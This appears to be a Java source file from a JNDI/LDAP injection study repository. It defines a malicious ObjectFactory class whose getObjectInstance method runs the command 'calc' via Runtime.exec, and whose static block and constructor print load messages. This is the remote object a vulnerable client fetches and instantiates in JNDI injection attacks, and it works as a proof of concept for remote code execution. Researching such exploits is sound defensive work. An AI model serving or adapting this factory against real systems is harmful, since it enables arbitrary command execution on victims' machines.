package run.ergou.jndi.ldap;

// 编译

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class ObjFactory implements ObjectFactory {
    static {
        System.out.println("initialize");
    }

    public ObjFactory(){
        System.out.println("instantiate");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}